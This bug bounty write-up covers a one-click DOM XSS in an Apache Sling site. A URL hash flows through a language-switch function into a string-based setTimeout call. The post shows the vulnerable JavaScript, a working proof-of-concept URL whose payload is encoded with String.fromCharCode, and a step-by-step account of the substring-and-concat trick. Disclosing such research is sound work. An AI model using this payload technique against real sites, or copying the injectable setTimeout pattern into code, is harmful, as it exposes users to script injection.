
# Hash XSS

During my early start in bug bounty, I ended up researching on an Apache Sling application serving web content for customers, it was possible for them to subscribe and find out offers that benefit them.

While reviewing the javascript files, I stumbled upon an interesting injection flaw located in a function called `sendAnalyticsEvent`,

```
function sendAnalyticsEvent(link, site, page, value) {
    try {
        _gaq.push(['_trackEvent', site, page, value]);
        window.setTimeout("window.location.href='" + link + "'", 200);
        return false;
    } catch (err) {}
}
```

`setTimeout` is a function that executes code after expiration ofa time delay, it accepts raw code or a function reference.

As you can see, it looks like the parameter `link` is directly concatenated with actual javascript code that is supposed to be executed by setTimeout. This means that if the attacker can influence the `link` parameter, it should result in XSS.

## The POC

The XSS was triggered by sending the payload in the hash of the URL. The application had a `switchLanguage` functionality that would replace the language path inside the URL, then send `location.href` to the `sendAnalyticsEvent` function. `location.href` includes the url + hash.

```
function switchLanguage() {
  const newLocation = location.href.replaceAll("en", "fr")
  sendAnalyticsEvent(newLocation)
}
```

This resulted in a one click XSS once the user changed the language.

The payload looked like this:

```
https://www.redacted.com/en/index.html#a'.substring(1000).concat(String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,101,118,97,108,40,39,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,98,111,100,121,46,105,110,110,101,114,72,84,77,76,41,39,41));//
```

A few important points:
-  Added is a call to substring with a large amount, to get rid of the url start `https://www.redacted.com/en/index.html#a'`, resulting in an empty string as URL.
```
1. "window.location.href='" + "https://www.redacted.com/en/index.html#a'.substring(1000)"
2. "window.location.href='https://www.redacted.com/en/index.html#a'.substring(1000)"
3. "window.location.href=''"
```
- The javascript url payload can then be appended to the empty string, resulting in something like
```
1. window.location.href="".concat(String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,101,118,97,108,40,39,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,98,111,100,121,46,105,110,110,101,114,72,84,77,76,41,39,41));//
2. window.location.href="".concat('javascript:eval('alert(document.body.innerHTML)')
3. window.location.href="javascript:eval('alert(document.body.innerHTML)')"
```

The client fixed the injection by removing the hash.

In a follow up post, I will explain how I bypassed this fix by using Apache Sling URL decomposition.






